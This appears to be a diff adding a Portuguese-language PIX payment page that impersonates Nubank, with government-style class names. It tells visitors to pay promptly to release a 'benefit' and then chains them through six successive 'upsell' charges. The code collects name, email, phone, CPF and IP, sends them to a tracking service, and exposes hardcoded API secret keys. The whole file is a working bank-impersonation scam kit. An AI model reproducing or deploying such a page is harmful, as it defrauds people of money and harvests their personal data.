@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.html" type="image/x-icon">
+    <link rel="stylesheet" href="../style.html">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-ignore-iframe="" async="" defer=""></script>
+<script>
+  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#831BD1', // Cor primária Nubank
+                        'secondary': '#EFEFEF', // Cinza claro Nubank
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF' // Cor clara para fundos
+                    },
+                    fontFamily: {
+                        'sans': ['Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap');
+
+        * {
+            font-family: Arial, Helvetica, sans-serif !important;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #F8F8F8;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+
+        .govbr-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Estilo para o header no estilo Nubank */
+        header {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        header img {
+            width: 110px;
+            margin: 10px;
+            height: auto;
+        }
+
+        /* Botões estilo Nubank */
+        .govbr-button {
+            background-color: #831BD1;
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 16px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(131, 27, 209, 0.3);
+        }
+
+        .govbr-button:hover {
+            background-color: #6F17B1;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(131, 27, 209, 0.4);
+        }
+
+        .govbr-outline-button {
+            border: 2px solid #831BD1;
+            color: #831BD1;
+            transition: all 0.3s ease;
+            border-radius: 24px;
+        }
+
+        .govbr-outline-button:hover {
+            background-color: #831BD1;
+            color: white;
+        }
+
+        .govbr-card {
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .govbr-input {
+            border: 2px solid #DDDDDD;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #F8F8F8;
+        }
+
+        .govbr-input:disabled {
+            background-color: #EFEFEF;
+            color: #555;
+        }
+
+        .govbr-badge {
+            background-color: #831BD1;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .govbr-timer {
+            color: #FF3333;
+            font-weight: bold;
+        }
+
+        .govbr-loading {
+            border-top-color: #831BD1;
+        }
+
+        .govbr-success-icon {
+            color: #831BD1;
+        }
+
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .valor-aprovado-container {
+            background-color: #F8F8F8;
+            border-left: 4px solid #831BD1;
+            padding: 12px;
+            margin: 16px 0;
+            text-align: left;
+        }
+
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        .valor-aprovado {
+            color: #831BD1;
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+        }
+
+        /* Adiciona estilos para o popup de notificação */
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #831BD1;
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+
+        /* Estilo Nubank para os cards */
+        .bg-white {
+            border-radius: 12px;
+        }
+
+        /* Ajuste para cor de fundo no estilo Nubank */
+        .bg-yellow-500 {
+            background-color: #831BD1 !important;
+        }
+
+        /* Ajuste para cor de fundo da barra informativa */
+        .bg-blue-600 {
+            background-color: #831BD1 !important;
+        }
+
+        /* Estilo Nubank para os containers */
+        .rounded-md {
+            border-radius: 12px;
+        }
+
+        /* Ajuste para cor verde de confirmação */
+        .bg-green-600 {
+            background-color: #831BD1 !important;
+        }
+
+        .text-green-600 {
+            color: #831BD1 !important;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <noscript>
+        <img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=9432167203543880&amp;ev=PageView&amp;noscript=1" />
+    </noscript>
+
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <!-- Header do Nubank -->
+    <header class="bg-white px-4 shadow-md">
+        <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+            <img alt="Logo Nubank" width="1920" height="1080" class="w-auto h-12" style="color:transparent"
+                src="images/nu.webp">
+        </div>
+    </header>
+
+    <div id="loadingPage"
+        class="fixed inset-0 w-full h-full bg-[#831BD1]/95 z-50 flex items-center justify-center hidden fade-in">
+        <div class="flex flex-col items-center justify-center">
+            <div class="relative w-40 h-40 mb-8">
+                <!-- Logo com efeito de pulsação -->
+                <img src="images/nu.webp" alt="Logo Nubank"
+                    class="w-32 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10 animate-pulse">
+
+                <!-- Anel de carregamento animado -->
+                <svg class="w-40 h-40 absolute top-0 left-0" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255, 255, 255, 0.2)" stroke-width="6">
+                    </circle>
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="white" stroke-width="6" stroke-linecap="round"
+                        stroke-dasharray="283" stroke-dashoffset="100">
+                        <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="2s"
+                            repeatCount="indefinite"></animateTransform>
+                    </circle>
+                </svg>
+            </div>
+
+            <div class="text-center text-white">
+                <h1 class="text-2xl font-bold mb-3">
+                    Preparando seu pagamento
+                </h1>
+                <p id="loadingMessage" class="text-base opacity-90">
+                    Estamos gerando seu QR Code Pix...
+                </p>
+
+                <!-- Indicador de pontos carregando -->
+                <div class="flex justify-center mt-4 space-x-1">
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="mainPage" class="main-content fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6 rounded-md shadow-md">
+                <h1 class="text-2xl font-bold text-dark mb-6">Pagamento via PIX</h1>
+
+                <div class="valor-aprovado-container">
+                    <span class="valor-aprovado-label">Valor a pagar:</span>
+                    <span class="valor-aprovado" id="valorPagamento">Carregando...</span>
+                </div>
+
+                <div class="mt-6">
+                    <p class="text-sm text-gray-600 mb-4">
+                        Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento.
+                    </p>
+
+                    <div class="flex flex-col items-center space-y-4">
+                        <div id="qrCodeContainer"
+                            class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 hover:bg-gray-50 transition-colors cursor-pointer"
+                            onclick="copyPixCode()">
+                            <img id="qrCodeImage" src="#" alt="QR Code PIX" class="w-48 h-48">
+                        </div>
+
+                        <div class="w-full">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">
+                                Código PIX (Copiar e Colar)
+                            </label>
+                            <div class="flex">
+                                <input type="text" id="pixCode" class="govbr-input flex-1" readonly="">
+                                <button id="copiar-codigo" onclick="copyPixCode()" class="govbr-button ml-2">
+                                    Copiar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="dammn" class="mt-6">
+                        <div class="bg-blue-600 py-3 px-4 rounded-md text-white">
+                            <p class="text-base">
+                                <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para
+                                que possamos <strong>liberar seu benefício sem atrasos</strong>.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- =====================================================
+     ESTILO  —  feedback “copiado!” + animação do botão
+===================================================== -->
+    <style>
+        /* texto verde exibido por 1,5 s */
+        #copy-msg {
+            display: none;
+            font-size: .875rem;
+            color: #16a34a;
+            margin-top: .25rem;
+            text-align: center;
+            opacity: 0;
+            transition: opacity .3s ease;
+            margin-bottom: 20px;
+        }
+
+        /* efeito scale+fade no clique */
+        #copiar-codigo.clicked {
+            transform: scale(1.07);
+            opacity: .8;
+            transition: transform .12s, opacity .12s;
+        }
+    </style>
+
+<!-- =====================================================
+     SCRIPT — integração Viper Pay + upsells dinâmicos + UTMify
+     COM POLLING AUTOMÁTICO E LOGS ANTES DO REDIRECT
+===================================================== -->
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+      /* ---------- CONFIGURAÇÃO Viper Pay & UTMify ---------- */
+      const VIPER_BASE   = 'https://api.viperpay.com.br';
+      const VIPER_SECRET = 'sk_ee69aa213a9a082d9b270a6e2f848dbd6cecda889929c511b1db06e87024d2cbf2b27054bd39da2408bad1344dc461ad1e9e56cd86718d81a23dbe04b2a6a3d7';
+      const UTMIFY_TOKEN = '0raUPpalmqzh7BotADHPCMNSZZDfrOj4feSq';
+    
+      const qs        = new URLSearchParams(location.search);
+      const cent2real = c => (c / 100).toFixed(2);
+      const formatBRL = c => (c / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    
+      /* ---------- UPSSELL FLOW ---------- */
+      const upsellFlow = {
+        '1': { next: 'upsell2', val: '1970' },
+        '2': { next: 'upsell3', val: '1790' },
+        '3': { next: 'upsell4', val: '2490' },
+        '4': { next: 'upsell5', val: '3980' },
+        '5': { next: 'upsell6', val: '2490' },
+        '6': { next: 'obrigado', val: '0' }
+      };
+      function goToNextUpsell() {
+        const from = qs.get('from_upsell') || '1';
+        const { next, val } = upsellFlow[from] || upsellFlow['1'];
+        const p = new URLSearchParams(location.search);
+        p.set('from_upsell', String(parseInt(from) + 1));
+        p.set('valor', val);
+        console.log(`[redirect] indo para ${next} com params:`, p.toString());
+        window.location.href = `/consult/${next}/index.html?${p.toString()}`;
+      }
+    
+      /* ---------- COPY FEEDBACK ---------- */
+      function copyPixCode() {
+        const input = document.getElementById('pixCode');
+        if (!input) return;
+        navigator.clipboard.writeText(input.value)
+          .catch(()=>{ input.select(); document.execCommand('copy'); });
+        console.log('[copy] código PIX copiado');
+        const btn = document.getElementById('copiar-codigo');
+        btn?.classList.add('clicked');
+        setTimeout(()=>btn?.classList.remove('clicked'),150);
+      }
+    
+      /* ---------- AUXILIARES ---------- */
+      async function getClientIp(){
+        try { let r=await fetch('https://api.ipify.org?format=json'); let j=await r.json(); return j.ip||'127.0.0.1'; }
+        catch{ return '127.0.0.1'; }
+      }
+      function mkQR(code){
+        const img=new Image();
+        img.src=`https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(code)}&size=300x300`;
+        return img;
+      }
+    
+      /* ---------- UTMify POST (com logs) ---------- */
+      async function sendToUtmify(order){
+        console.log('[UTMify] enviando:',order);
+        const res = await fetch('https://api.utmify.com.br/api-credentials/orders',{
+          method:'POST',
+          headers:{ 'Content-Type':'application/json','x-api-token':UTMIFY_TOKEN },
+          body:JSON.stringify(order)
+        });
+        const json = await res.json();
+        console.log('[UTMify] HTTP',res.status,'result',json.result,'data',json.data,'message',json.message);
+        return { ok:res.ok && json.result==='SUCCESS', json };
+      }
+    
+      /* ---------- VARIÁVEL PARA ORDERS ---------- */
+      let utmifyOrder;
+    
+      /* ---------- INICIA PAGAMENTO PIX ---------- */
+      async function iniciarPagamento(){
+        const loading = document.getElementById('loadingPage');
+        const main    = document.getElementById('mainPage');
+        loading.classList.remove('hidden');
+        main.classList.add('hidden');
+    
+        const from    = qs.get('from_upsell')||'1';
+        const centVal = parseInt(qs.get('valor')||upsellFlow[from].val,10);
+        document.getElementById('valorPagamento').textContent = formatBRL(centVal);
+    
+        const name     = qs.get('nome')||'Cliente';
+        const email    = qs.get('email')||'email@exemplo.com';
+        const phone    = qs.get('telefone')||'5511999999999';
+        const doc      = qs.get('cpf')||'00000000000';
+        const extId    = `txn_${Date.now()}_${from}`;
+        const reais    = parseFloat(cent2real(centVal));
+        const ip       = await getClientIp();
+    
+        const pixBody = {
+          external_id:extId,
+          total_amount:reais,
+          payment_method:'PIX',
+          webhook_url:`${location.origin}/webhook-endpoint`,
+          items:[{ id:extId,title:`Upsell ${from}`,description:`Etapa ${from}`,price:reais,quantity:1,is_physical:false }],
+          ip,
+          customer:{ name,email,phone,document_type:doc.length===14?'CNPJ':'CPF',document:doc }
+        };
+        console.log('[PIX] request:',pixBody);
+    
+        const resp = await fetch(`${VIPER_BASE}/v1/transactions`,{
+          method:'POST',
+          headers:{ 'Content-Type':'application/json','api-secret':VIPER_SECRET },
+          body:JSON.stringify(pixBody)
+        });
+        const data = await resp.json();
+        console.log('[PIX] response:',data);
+    
+        if(!resp.ok||data.hasError){
+          console.error('[PIX] errorFields:',data.errorFields);
+          alert(`Erro PIX: ${data.error||resp.status}`); main.classList.remove('hidden');loading.classList.add('hidden');return;
+        }
+    
+        const code = data.pix.payload;
+        document.getElementById('pixCode').value=code;
+        const qrImg=mkQR(code);
+        const qrEl=document.getElementById('qrCodeImage');
+        qrEl.src=qrImg.src;
+    
+        // prepara UTMify initial
+        const now        = new Date().toISOString();
+        const cents      = Math.round(reais*100);
+        const fee        = Math.round(cents*0.10);
+        const commission = { totalPriceInCents:cents,gatewayFeeInCents:fee,userCommissionInCents:cents-fee };
+        const statusMap  = { PENDING:'waiting_payment',AUTHORIZED:'paid',FAILED:'refused',CHARGEBACK:'chargedback',IN_DISPUTE:'waiting_payment' };
+        const utmStatus  = statusMap[data.status.toUpperCase()]||'waiting_payment';
+    
+        const tracking = {};
+        for(const [k,v] of qs) if(!['nome','email','telefone','cpf','valor','from_upsell'].includes(k)) tracking[k]=v;
+    
+        utmifyOrder={
+          orderId:data.id,platform:'ViperPay',paymentMethod:'pix',
+          status:utmStatus,createdAt:now,approvedDate:null,refundedAt:null,
+          customer:{name,email,phone,document:doc,country:'BR',ip},
+          products:pixBody.items.map(i=>({id:i.id,name:i.title,planId:null,planName:null,quantity:i.quantity,priceInCents:Math.round(i.price*100)})),
+          trackingParameters:tracking,commission,isTest:false
+        };
+    
+        // envia initial UTMify
+        const initRes = await sendToUtmify(utmifyOrder);
+        console.log('[UTMify] initial ok?',initRes.ok);
+    
+        // inicia polling
+        localStorage.setItem('currentPayment',JSON.stringify({id:data.id}));
+        const timer = setInterval(()=>checkStatus(data.id,timer),1000);
+    
+        main.classList.remove('hidden');
+        loading.classList.add('hidden');
+      }
+    
+      /* ---------- POLLING & UTMify UPDATE ---------- */
+      async function checkStatus(txId,timer){
+        console.log(`[status] checando ${txId} às ${new Date().toISOString()}`);
+        try{
+          const res = await fetch(`${VIPER_BASE}/v1/transactions/${txId}`,{
+            headers:{ 'Content-Type':'application/json','api-secret':VIPER_SECRET }
+          });
+          const j = await res.json();
+          console.log('[status] ViperPay retornou:',j.status);
+          if(j.status==='AUTHORIZED'){
+            clearInterval(timer);
+            localStorage.removeItem('currentPayment');
+            // atualiza order para UTMify
+            utmifyOrder.status       = 'paid';
+            utmifyOrder.approvedDate = new Date().toISOString();
+            const updRes = await sendToUtmify(utmifyOrder);
+            console.log('[UTMify] update ok?',updRes.ok);
+            // redireciona
+            goToNextUpsell();
+          }
+        }catch(e){
+          console.error('[status] erro ao checar:',e);
+        }
+      }
+    
+      /* ---------- BOOT ---------- */
+      iniciarPagamento();
+      document.getElementById('copiar-codigo')?.addEventListener('click',copyPixCode);
+    });
+    </script>
+    
+    
+
+
+</body>
+
+</html>
